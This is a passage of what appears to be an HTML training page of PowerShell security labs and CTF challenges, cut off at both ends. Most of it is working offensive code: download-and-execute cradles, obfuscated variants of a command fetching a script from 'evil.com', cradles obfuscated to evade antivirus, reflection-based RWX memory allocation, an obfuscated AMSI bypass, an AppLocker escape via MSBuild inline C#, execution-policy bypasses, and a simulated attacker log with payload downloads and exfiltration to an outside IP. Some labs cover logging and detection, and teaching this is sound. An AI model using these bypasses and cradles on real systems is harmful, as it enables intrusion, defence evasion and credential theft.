+# Find users with AdminCount=1 (protected by AdminSDHolder)
+Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount, MemberOf
+
+# ACL enumeration
+(Get-ACL "AD:\CN=Domain Admins,CN=Users,DC=corp,DC=local").Access |
+  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner' }
+
+# Option B: Standalone lab — create mock data
+$mockUsers = @(
+    @{Name="svc_sql"; SPN="MSSQLSvc/db01.corp.local:1433"; Admin=$false}
+    @{Name="admin_backup"; SPN=$null; Admin=$true}
+    @{Name="jsmith"; SPN=$null; Admin=$false}
+)
+$mockUsers | ForEach-Object { [PSCustomObject]$_ } | Format-Table
+
+# Practice the workflow:
+# 1. Enumerate users → Find service accounts → Kerberoast candidates
+# 2. Enumerate groups → Find privileged groups → Map membership
+# 3. Enumerate computers → Identify DCs, servers → Find delegation
+# 4. Check ACLs → Find misconfigurations → Plan attack path</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 8 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 8: In-Memory Script Execution and Cradles</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Practice various download cradle techniques and in-memory execution.</p>
+<pre><code class="language-powershell"># Setup: Create a simple HTTP server with a test payload
+# payload.ps1 content: Write-Host "Payload executed from: $($MyInvocation.InvocationName)" -ForegroundColor Cyan; $env:COMPUTERNAME
+
+# Step 1: Start a simple web server (Python)
+# In separate terminal: python -m http.server 8080 --directory C:\Lab\payloads
+
+# Create test payload
+Set-Content -Path C:\Lab\payloads\payload.ps1 -Value @'
+Write-Host "=== PAYLOAD EXECUTED ===" -ForegroundColor Green
+Write-Host "Method: $args" -ForegroundColor Yellow
+Write-Host "PID: $PID"
+Write-Host "User: $(whoami)"
+$ExecutionContext.SessionState.LanguageMode
+'@
+
+# Step 2: Test each cradle method
+$url = "http://localhost:8080/payload.ps1"
+
+# Cradle 1: Classic WebClient
+IEX (New-Object Net.WebClient).DownloadString($url)
+
+# Cradle 2: Invoke-WebRequest
+IEX (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
+
+# Cradle 3: Invoke-RestMethod
+IEX (Invoke-RestMethod -Uri $url)
+
+# Cradle 4: .NET HttpClient (modern)
+$client = [System.Net.Http.HttpClient]::new()
+IEX $client.GetStringAsync($url).Result
+
+# Cradle 5: WebRequest class
+$req = [System.Net.WebRequest]::Create($url)
+$resp = $req.GetResponse()
+$reader = New-Object IO.StreamReader($resp.GetResponseStream())
+IEX $reader.ReadToEnd()
+$reader.Close(); $resp.Close()
+
+# Step 3: Test .NET assembly loading
+# Create a simple C# assembly
+Add-Type -TypeDefinition @'
+public class TestPayload {
+    public static string Execute() {
+        return "Assembly loaded and executed in PID: " + System.Diagnostics.Process.GetCurrentProcess().Id;
+    }
+}
+'@ -OutputAssembly C:\Lab\payloads\payload.dll
+
+# Load from bytes (in-memory)
+$bytes = [IO.File]::ReadAllBytes("C:\Lab\payloads\payload.dll")
+[System.Reflection.Assembly]::Load($bytes)
+[TestPayload]::Execute()
+
+# Step 4: Compare which methods leave disk artifacts vs pure memory execution</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 9 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 9: Obfuscation Techniques and Detection</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Apply obfuscation to PowerShell commands and then detect/deobfuscate them.</p>
+<pre><code class="language-powershell"># Target command to obfuscate:
+$original = 'Invoke-WebRequest -Uri "http://evil.com/shell.ps1" | Invoke-Expression'
+
+# Technique 1: String concatenation
+$obf1 = '& ((''Inv'' + ''oke-Web'' + ''Request'')) -Uri ("ht" + "tp://evil" + ".com/shell.ps1") | & ((''Inv'' + ''oke-Exp'' + ''ression''))'
+
+# Technique 2: Character array
+$obf2 = '& ([string]::new([char[]]@(73,110,118,111,107,101,45,87,101,98,82,101,113,117,101,115,116))) -Uri "http://evil.com/shell.ps1" | IEX'
+
+# Technique 3: Base64 encoding
+$obf3enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($original))
+$obf3 = "powershell -EncodedCommand $obf3enc"
+
+# Technique 4: Format string
+$obf4 = '& ("{2}{0}{1}" -f ''ke-WebReq'',''uest'',''Invo'') -Uri ("{0}{1}" -f ''http://evil.com'',''/shell.ps1'') | & ("{0}{1}" -f ''Invoke-'',''Expression'')'
+
+# Technique 5: XOR encoding with runtime decoder
+$key = 42
+$xored = [Convert]::ToBase64String(([Text.Encoding]::UTF8.GetBytes($original) | ForEach-Object { $_ -bxor $key }))
+$obf5 = "`$d=[Convert]::FromBase64String('$xored');`$r=-join(`$d|%{[char](`$_ -bxor 42)});IEX `$r"
+
+# Technique 6: Reverse string
+$reversed = -join ($original[-1..-($original.Length)])
+$obf6 = "`$r='$reversed';IEX (-join `$r[-1..-(`$r.Length)])"
+
+# DETECTION: Run each and check Script Block Logging
+# Event 4104 should show the DEOBFUSCATED version regardless of technique!
+Write-Host "Enable Script Block Logging and run each obfuscated variant"
+Write-Host "Then check logs — PS logs the deobfuscated script block"
+
+# Manual deobfuscation practice:
+# Given an obfuscated sample, work through it step by step
+$sample = 'sal a]                                                                              New-Object;iex(a]                                                                              IO.StreamReader((a]                                                                              IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(''some_base64_here''),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII).ReadToEnd()'
+# Break down: sal = Set-Alias, a] = alias for New-Object, deflate stream decompression</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 10 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 10: Transcription Analysis</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Enable transcription, simulate an attack session, then perform forensic analysis on the transcript.</p>
+<pre><code class="language-powershell"># Step 1: Enable transcription
+$transcriptPath = "C:\Lab\Transcripts"
+New-Item -Path $transcriptPath -ItemType Directory -Force
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "OutputDirectory" -Value $transcriptPath
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableInvocationHeader" -Value 1
+
+# Step 2: Open NEW PowerShell session and simulate attack activity
+# (Simulated — not actually malicious)
+Start-Process powershell -ArgumentList '-NoProfile', '-Command', @'
+whoami /all
+net user
+net localgroup Administrators
+Get-Process lsass
+Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object -First 10
+[System.Net.Dns]::GetHostAddresses("dc01.corp.local")
+$env:USERDNSDOMAIN
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+Get-WmiObject Win32_Product | Select-Object Name, Version -First 5
+"Attack simulation complete"
+'@
+
+# Step 3: Wait and analyze transcripts
+Start-Sleep -Seconds 5
+$transcripts = Get-ChildItem $transcriptPath -Recurse -Filter "*.txt"
+Write-Host "Found $($transcripts.Count) transcript files"
+
+# Step 4: Parse transcripts for IOCs
+foreach ($file in $transcripts) {
+    $content = Get-Content $file.FullName -Raw
+    Write-Host "`n=== $($file.Name) ===" -ForegroundColor Cyan
+    
+    # Check for reconnaissance commands
+    $recon = @('whoami', 'net user', 'net localgroup', 'Get-Process lsass', 'USERDNSDOMAIN')
+    foreach ($indicator in $recon) {
+        if ($content -match [regex]::Escape($indicator)) {
+            Write-Host "[!] RECON: $indicator" -ForegroundColor Yellow
+        }
+    }
+}
+
+# Step 5: Build a timeline from transcripts
+$transcripts | ForEach-Object {
+    $content = Get-Content $_.FullName
+    $timestamp = ($content | Select-String "Start time:").Line
+    $user = ($content | Select-String "Username:").Line
+    [PSCustomObject]@{
+        File = $_.Name
+        Time = $timestamp
+        User = $user
+    }
+} | Format-Table</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 11 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 11: PowerShell Remoting Attack Simulation</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Practice lateral movement techniques using PowerShell remoting.</p>
+<pre><code class="language-powershell"># Lab requires: At least 2 machines (or localhost with multiple endpoints)
+
+# Step 1: Create multiple constrained endpoints to simulate different servers
+# Endpoint simulating a "database server"
+New-PSSessionConfigurationFile -Path C:\Lab\DBServer.pssc -SessionType RestrictedRemoteServer `
+  -RunAsVirtualAccount `
+  -RoleDefinitions @{ "$env:COMPUTERNAME\Users" = @{ RoleCapabilities = 'ServiceManager' } }
+Register-PSSessionConfiguration -Name 'DBServer' -Path C:\Lab\DBServer.pssc -Force
+
+# Endpoint simulating a "web server" (intentionally misconfigured)
+New-PSSessionConfigurationFile -Path C:\Lab\WebServer.pssc -SessionType Default `
+  -RunAsVirtualAccount  # Misconfiguration: Default session type = full access!
+Register-PSSessionConfiguration -Name 'WebServer' -Path C:\Lab\WebServer.pssc -Force
+
+# Step 2: Enumerate available endpoints
+Get-PSSessionConfiguration | Select-Object Name, Permission | Format-Table -Wrap
+
+# Step 3: Test connectivity and privileges
+$dbSession = New-PSSession -ComputerName localhost -ConfigurationName DBServer
+$webSession = New-PSSession -ComputerName localhost -ConfigurationName WebServer
+
+# Check what we can do in each
+Invoke-Command -Session $dbSession -ScriptBlock { Get-Command | Measure-Object }
+Invoke-Command -Session $webSession -ScriptBlock { Get-Command | Measure-Object }
+
+# Step 4: Attempt privilege escalation via misconfigured endpoint
+Invoke-Command -Session $webSession -ScriptBlock {
+    whoami  # Running as virtual account (local admin!)
+    Get-LocalGroupMember -Group Administrators
+    # This is the "web server" — full language mode, virtual admin account
+    $ExecutionContext.SessionState.LanguageMode
+}
+
+# Step 5: Demonstrate double-hop issue
+Invoke-Command -Session $webSession -ScriptBlock {
+    # Try to reach another machine from here — will fail (no creds)
+    try {
+        Invoke-Command -ComputerName localhost -ConfigurationName DBServer -ScriptBlock { whoami } -ErrorAction Stop
+    } catch {
+        "Double-hop blocked: $_"
+    }
+}
+
+# Step 6: Fan-out execution
+$targets = @('localhost')  # In real lab, multiple machines
+Invoke-Command -ComputerName $targets -ScriptBlock {
+    [PSCustomObject]@{
+        Computer = $env:COMPUTERNAME
+        OS = (Get-CimInstance Win32_OperatingSystem).Caption
+        LastBoot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+        AdminUsers = (Get-LocalGroupMember Administrators).Name -join ', '
+    }
+} | Format-Table -AutoSize
+
+# Cleanup
+Remove-PSSession $dbSession, $webSession
+Unregister-PSSessionConfiguration -Name 'DBServer' -Force
+Unregister-PSSessionConfiguration -Name 'WebServer' -Force</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 12 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 12: .NET Reflection for Win32 API Calls</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Use .NET reflection to call Windows APIs directly from PowerShell without Add-Type.</p>
+<pre><code class="language-powershell"># Step 1: Understand the goal — call Win32 APIs without Add-Type
+# Add-Type compiles to disk and is easily detected. Dynamic P/Invoke avoids this.
+
+# Step 2: Find GetModuleHandle and GetProcAddress via reflection
+$systemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | 
+  Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' }
+$unsafeNativeMethods = $systemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+# Get method references
+$getModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')
+$getProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', 
+  [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
+
+# Step 3: Resolve kernel32 function addresses
+$kernel32 = $getModuleHandle.Invoke($null, @("kernel32.dll"))
+$kernel32Ref = New-Object System.Runtime.InteropServices.HandleRef([IntPtr]::Zero, $kernel32)
+
+# Get VirtualAlloc address
+$virtualAllocAddr = $getProcAddress.Invoke($null, @($kernel32Ref, "VirtualAlloc"))
+Write-Host "VirtualAlloc @ $virtualAllocAddr"
+
+# Get VirtualProtect address
+$virtualProtectAddr = $getProcAddress.Invoke($null, @($kernel32Ref, "VirtualProtect"))
+Write-Host "VirtualProtect @ $virtualProtectAddr"
+
+# Step 4: Create delegate types dynamically
+function New-DelegateType {
+    param([Type[]]$Parameters, [Type]$ReturnType = [Void])
+    
+    $domain = [AppDomain]::CurrentDomain
+    $dynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegates')
+    $assemblyBuilder = $domain.DefineDynamicAssembly($dynAssembly, 'Run')
+    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+    $typeBuilder = $moduleBuilder.DefineType('DelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [MulticastDelegate])
+    
+    $ctorBuilder = $typeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', 'Standard', @([IntPtr], [IntPtr]))
+    $ctorBuilder.SetImplementationFlags('Runtime, Managed')
+    
+    $methodBuilder = $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+    $methodBuilder.SetImplementationFlags('Runtime, Managed')
+    
+    $typeBuilder.CreateType()
+}
+
+# Step 5: Create VirtualAlloc delegate
+$virtualAllocDelegate = New-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
+$virtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($virtualAllocAddr, $virtualAllocDelegate)
+
+# Step 6: Call VirtualAlloc (allocate RWX memory — for educational purposes)
+$MEM_COMMIT_RESERVE = 0x3000
+$PAGE_EXECUTE_READWRITE = 0x40
+$allocSize = 4096
+$memAddr = $virtualAlloc.Invoke([IntPtr]::Zero, $allocSize, $MEM_COMMIT_RESERVE, $PAGE_EXECUTE_READWRITE)
+Write-Host "Allocated memory at: $memAddr"
+
+# Step 7: Write to allocated memory
+$testBytes = [byte[]]@(0x90, 0x90, 0x90, 0xC3)  # NOP NOP NOP RET
+[System.Runtime.InteropServices.Marshal]::Copy($testBytes, 0, $memAddr, $testBytes.Length)
+Write-Host "Wrote $($testBytes.Length) bytes to allocated memory"
+
+# Step 8: Verify you can read it back
+$readBack = [byte[]]::new(4)
+[System.Runtime.InteropServices.Marshal]::Copy($memAddr, $readBack, 0, 4)
+Write-Host "Read back: $($readBack | ForEach-Object { '0x{0:X2}' -f $_ })"
+
+# This demonstrates: finding APIs via reflection, creating delegates, and calling them
+# without ever using Add-Type or touching disk</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 13 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 13: Cradle Obfuscation and AV Evasion</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Build progressively obfuscated download cradles and test detection.</p>
+<pre><code class="language-powershell"># Setup: Create a benign payload for testing
+$payloadContent = 'Write-Host "CRADLE SUCCESS: $(Get-Date)" -ForegroundColor Green'
+Set-Content -Path C:\Lab\payloads\test.ps1 -Value $payloadContent
+# Serve via: python -m http.server 8080 --directory C:\Lab\payloads
+
+$url = "http://localhost:8080/test.ps1"
+
+# Level 0: Plain cradle (easily detected)
+IEX (New-Object Net.WebClient).DownloadString($url)
+
+# Level 1: Variable indirection
+$wc = New-Object Net.WebClient; $data = $wc.DownloadString($url); IEX $data
+
+# Level 2: String obfuscation of cmdlet names
+$a = "Ne"; $b = "w-Ob"; $c = "ject"
+$d = "Net.We"; $e = "bClient"
+$obj = & ($a+$b+$c) ($d+$e)
+$payload = $obj.DownloadString($url)
+& (('{0}{1}' -f 'IE','X')) $payload
+
+# Level 3: Base64 encoded URL
+$urlBytes = [Text.Encoding]::UTF8.GetBytes($url)
+$urlB64 = [Convert]::ToBase64String($urlBytes)
+$decodedUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($urlB64))
+IEX (New-Object Net.WebClient).DownloadString($decodedUrl)
+
+# Level 4: Multi-stage with environment variables
+$env:_u = $url
+$env:_m = "DownloadString"
+$wc = New-Object Net.WebClient
+$method = $wc.GetType().GetMethod($env:_m)
+$result = $method.Invoke($wc, @($env:_u))
+IEX $result
+Remove-Item env:_u, env:_m
+
+# Level 5: Reflection-based invocation (avoid string "IEX")
+$wc = New-Object Net.WebClient
+$data = $wc.DownloadString($url)
+$sb = [ScriptBlock]::Create($data)
+& $sb
+
+# Level 6: Compressed payload delivery
+$raw = [Text.Encoding]::UTF8.GetBytes($payloadContent)
+$ms = New-Object IO.MemoryStream
+$gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Compress)
+$gz.Write($raw, 0, $raw.Length); $gz.Close()
+$compressed = [Convert]::ToBase64String($ms.ToArray())
+Write-Host "Compressed payload: $compressed"
+# Decompress and execute
+$decoded = [Convert]::FromBase64String($compressed)
+$msD = New-Object IO.MemoryStream(,$decoded)
+$gzD = New-Object IO.Compression.GZipStream($msD, [IO.Compression.CompressionMode]::Decompress)
+$reader = New-Object IO.StreamReader($gzD)
+IEX $reader.ReadToEnd()
+
+# Compare: Which levels trigger Windows Defender / AMSI?
+# Test with AMSI enabled and then with bypass applied</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 14 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 14: AMSI Provider Analysis with ETW</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Trace AMSI scan operations using ETW to understand what gets scanned and when.</p>
+<pre><code class="language-powershell"># Step 1: List AMSI providers
+Get-ChildItem "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" | ForEach-Object {
+    $guid = $_.PSChildName
+    $path = (Get-ItemProperty "HKLM:\SOFTWARE\Classes\CLSID\$guid\InprocServer32").'(default)'
+    [PSCustomObject]@{ GUID = $guid; DLL = $path }
+}
+
+# Step 2: Start ETW trace for AMSI
+$traceName = "AMSILab"
+logman create trace $traceName -p Microsoft-Antimalware-Scan-Interface -o C:\Lab\amsi_trace.etl -ets
+
+# Step 3: Generate various scan events
+# Simple command
+"Hello World"
+
+# Known malicious string (test)
+try { IEX "Invoke-Mimikatz" } catch {}
+
+# Obfuscated command
+$a = 'Inv'; $b = 'oke-Mim'; $c = 'ikatz'; try { IEX ($a+$b+$c) } catch {}
+
+# .NET assembly load
+try { [Reflection.Assembly]::Load([byte[]]@(77,90)) } catch {}
+
+# Step 4: Stop trace and analyze
+logman stop $traceName -ets
+
+# Step 5: Parse ETL file (requires Windows Performance Analyzer or)
+# Use Get-WinEvent to read ETL
+$events = Get-WinEvent -Path C:\Lab\amsi_trace.etl -Oldest
+$events | ForEach-Object {
+    [PSCustomObject]@{
+        Time = $_.TimeCreated
+        Id = $_.Id
+        Message = $_.Message
+    }
+} | Format-Table -Wrap
+
+# Step 6: Alternative — use PowerShell script-based AMSI testing
+# Create a function that checks if AMSI blocks specific strings
+function Test-AMSIScan {
+    param([string]$TestString)
+    try {
+        $result = Invoke-Expression "Write-Output '$TestString'" 2>&1
+        if ($result -match "malicious content") { return "BLOCKED" }
+        return "ALLOWED"
+    } catch {
+        if ($_.Exception.Message -match "malicious") { return "BLOCKED" }
+        return "ERROR: $($_.Exception.Message)"
+    }
+}
+
+# Test various strings
+@("Hello", "Invoke-Mimikatz", "AmsiScanBuffer", "normal text") | ForEach-Object {
+    [PSCustomObject]@{ String = $_; Result = Test-AMSIScan $_ }
+} | Format-Table</code></pre>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- ==================== CTF TAB ==================== -->
+      <div class="tab-pane fade" id="ctf" role="tabpanel">
+
+        <h2>CTF Challenges</h2>
+
+        <!-- CTF 1 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Challenge 1: Policy Breaker</h5></div>
+          <div class="card-body">
+            <p><strong>Scenario:</strong> You've gained a shell on a locked-down workstation. Execution policy is set to <code>AllSigned</code> via GPO (MachinePolicy scope). You have a script <code>recon.ps1</code> that performs domain enumeration but it's unsigned. Execute it.</p>
+            <p><strong>Constraints:</strong></p>
+            <ul>
+              <li>Cannot modify GPO (no domain admin)</li>
+              <li>Cannot sign the script (no code signing cert)</li>
+              <li>Must execute the full script (not just individual commands)</li>
+            </ul>
+            <details>
+              <summary><strong>Hints</strong></summary>
+              <ol>
+                <li>Remember: execution policy only applies to <em>files</em> being run directly</li>
+                <li>What happens when you read a file into memory and execute the string?</li>
+                <li>The <code>-Command</code> parameter with dot-sourcing technically loads a file but processes it as a command</li>
+              </ol>
+            </details>
+            <details>
+              <summary><strong>Solution</strong></summary>
+<pre><code class="language-powershell"># Method 1: Read file content and execute as string (not a "file execution")
+$script = Get-Content .\recon.ps1 -Raw
+Invoke-Expression $script
+
+# Method 2: Pipe content to PowerShell process
+Get-Content .\recon.ps1 | powershell.exe -NoProfile -
+
+# Method 3: Use -Command which processes differently than -File
+powershell.exe -Command "& { . .\recon.ps1 }"
+
+# Method 4: Base64 encode the entire script
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content .\recon.ps1 -Raw)))
+powershell.exe -EncodedCommand $encoded
+
+# Method 5: .NET PowerShell class (bypasses policy entirely)
+$ps = [PowerShell]::Create()
+$ps.AddScript((Get-Content .\recon.ps1 -Raw))
+$ps.Invoke()
+
+# Key insight: GPO MachinePolicy=AllSigned only blocks DIRECT file execution
+# It does NOT prevent reading files or executing strings</code></pre>
+            </details>
+          </div>
+        </div>
+
+        <!-- CTF 2 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Challenge 2: AMSI Assassin</h5></div>
+          <div class="card-body">
+            <p><strong>Scenario:</strong> You need to load a known-malicious PowerShell tool into memory, but AMSI is blocking every attempt. Windows Defender is the AMSI provider. You cannot disable Defender (no admin for that). Bypass AMSI from your current user-level PowerShell session.</p>
+            <p><strong>Flag:</strong> Successfully execute <code>"Invoke-Mimikatz -Command 'privilege::debug'"</code> without AMSI blocking it (the command will fail because Mimikatz isn't actually loaded, but it shouldn't be <em>blocked by AMSI</em>).</p>
+            <details>
+              <summary><strong>Hints</strong></summary>
+              <ol>
+                <li>AMSI state is per-process — you only need to break it in YOUR session</li>
+                <li>The <code>amsiInitFailed</code> field is checked before every scan</li>
+                <li>Be careful: the bypass code itself might trigger AMSI. Obfuscate the bypass!</li>
+              </ol>
+            </details>
+            <details>
+              <summary><strong>Solution</strong></summary>
+<pre><code class="language-powershell"># The challenge: even the bypass code gets caught by AMSI
+# Solution: obfuscate the bypass itself
+
+# Step 1: Break up the string "AmsiUtils" so AMSI doesn't flag it
+$u = 'Si'; $t = 'lS'; $a = 'Am'
+$typeName = "System.Management.Automation.$($a)$($u)Ut$($t.Substring(1))s"  
+# Wait — let's be more careful
+
+# Better approach: use hex/char codes for the type name
+$chars = @(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)
+$typeName = -join ($chars | ForEach-Object { [char]$_ })
+
+# Step 2: Get the type and field using the constructed string
+$type = [Ref].Assembly.GetType($typeName)
+
+# Construct "amsiInitFailed" similarly
+$fieldChars = @(97,109,115,105,73,110,105,116,70,97,105,108,101,100)
+$fieldName = -join ($fieldChars | ForEach-Object { [char]$_ })
+
+$field = $type.GetField($fieldName, 'NonPublic,Static')
+$field.SetValue($null, $true)
+
+# Step 3: Verify — this should now pass without AMSI blocking
+"Invoke-Mimikatz -Command 'privilege::debug'"
+# It will error because Invoke-Mimikatz isn't defined, but won't be BLOCKED by AMSI
+
+# Alternative one-liner (obfuscated):
+[Runtime.InteropServices.Marshal].GetType().GetMethods() | Out-Null
+$z = [Ref].Assembly.GetType((-join(@(0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4d,0x61,0x6e,0x61,0x67,0x65,0x6d,0x65,0x6e,0x74,0x2e,0x41,0x75,0x74,0x6f,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x41,0x6d,0x73,0x69,0x55,0x74,0x69,0x6c,0x73)|%{[char]$_})))
+$z.GetField((-join(@(0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64)|%{[char]$_})),'NonPublic,Static').SetValue($null,$true)</code></pre>
+            </details>
+          </div>
+        </div>
+
+        <!-- CTF 3 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Challenge 3: Language Escape</h5></div>
+          <div class="card-body">
+            <p><strong>Scenario:</strong> You have a PowerShell session running in Constrained Language Mode (enforced by AppLocker with default rules). You need to execute arbitrary C# code to call Win32 APIs. <code>Add-Type</code> is blocked. PowerShell v2 has been removed. Find another way.</p>
+            <p><strong>Flag:</strong> Call <code>MessageBoxA</code> from user32.dll to display a popup.</p>
+            <details>
+              <summary><strong>Hints</strong></summary>
+              <ol>
+                <li>AppLocker default rules trust everything in <code>C:\Windows\*</code></li>
+                <li>There are writable subdirectories under <code>C:\Windows\</code></li>
+                <li>MSBuild is a .NET Framework tool in <code>C:\Windows\Microsoft.NET\</code> — AppLocker trusts it</li>
+                <li>MSBuild can execute inline C# code via UsingTask</li>
+              </ol>
+            </details>
+            <details>
+              <summary><strong>Solution</strong></summary>
+<pre><code class="language-powershell"># Step 1: Find a writable directory trusted by AppLocker
+$target = "C:\Windows\Tasks"  # Commonly writable
+
+# Step 2: Create MSBuild project with inline C# task
+$msbuildPayload = @'
+&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+  &lt;Target Name="PopMsg"&gt;
+    &lt;ClassExample /&gt;
+  &lt;/Target&gt;
+  &lt;UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"&gt;
+    &lt;Task&gt;
+      &lt;Reference Include="System.Runtime.InteropServices" /&gt;
+      &lt;Code Type="Class" Language="cs"&gt;
+        &lt;![CDATA[
+        using System;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        public class ClassExample : Task, ITask {
+            [DllImport("user32.dll", CharSet = CharSet.Ansi)]
+            public static extern int MessageBoxA(IntPtr hWnd, string text, string caption, uint type);
+            
+            public override bool Execute() {
+                MessageBoxA(IntPtr.Zero, "FLAG: CLM_ESCAPED_VIA_MSBUILD", "CTF", 0);
+                return true;
+            }
+        }
+        ]]&gt;
+      &lt;/Code&gt;
+    &lt;/Task&gt;
+  &lt;/UsingTask&gt;
+&lt;/Project&gt;
+'@
+
+# Step 3: Write to trusted writable location
+Set-Content -Path "C:\Windows\Tasks\payload.csproj" -Value $msbuildPayload
+
+# Step 4: Execute via MSBuild (trusted by AppLocker)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Tasks\payload.csproj /t:PopMsg
+
+# Cleanup
+Remove-Item "C:\Windows\Tasks\payload.csproj"
+
+# Alternative: Use InstallUtil with custom installer class
+# Or: Use RegSvcs/RegAsm with COM-visible assembly</code></pre>
+            </details>
+          </div>
+        </div>
+
+        <!-- CTF 4 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Challenge 4: Log Forensics — Find the Attacker</h5></div>
+          <div class="card-body">
+            <p><strong>Scenario:</strong> A breach was detected. Script Block Logging was enabled. You've been given the PowerShell Operational event log. Analyze it to determine:</p>
+            <ol>
+              <li>What tool did the attacker use for domain enumeration?</li>
+              <li>What credential extraction method was employed?</li>
+              <li>What was the attacker's C2 server address?</li>
+              <li>Did the attacker attempt AMSI bypass? What method?</li>
+            </ol>
+            <p><strong>Simulated Log Data:</strong></p>
+<pre><code class="language-powershell"># Generate simulated attack logs for analysis
+$logSimulation = @(
+    @{Time="2024-03-15 02:14:33"; Script='$a=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$a.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'},
+    @{Time="2024-03-15 02:14:35"; Script='IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.200:8080/PowerView.ps1")'},
+    @{Time="2024-03-15 02:15:01"; Script='Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname | Export-Csv C:\Windows\Temp\spns.csv'},
+    @{Time="2024-03-15 02:15:44"; Script='Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember -Recurse'},
+    @{Time="2024-03-15 02:16:20"; Script='Find-LocalAdminAccess -Threads 20'},
+    @{Time="2024-03-15 02:18:05"; Script='Invoke-Kerberoast -OutputFormat Hashcat | Export-Csv C:\Windows\Temp\hashes.csv'},
+    @{Time="2024-03-15 02:20:11"; Script='IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.200:8080/Invoke-Mimikatz.ps1")'},
+    @{Time="2024-03-15 02:20:15"; Script='Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"'},
+    @{Time="2024-03-15 02:22:30"; Script='$data = Get-Content C:\Windows\Temp\hashes.csv -Raw; (New-Object Net.WebClient).UploadString("http://192.168.45.200:8080/exfil", $data)'}
+)
+
+# Write to file for analysis
+$logSimulation | ForEach-Object { 
+    "[$($_.Time)] $($_.Script)" 
+} | Set-Content C:\Lab\attack_log.txt
+
+# Analyze the log
+$log = Get-Content C:\Lab\attack_log.txt
+Write-Host "=== Attack Timeline ===" -ForegroundColor Red
+$log | ForEach-Object { Write-Host $_ }</code></pre>
+            <details>
+              <summary><strong>Solution</strong></summary>
+              <ol>
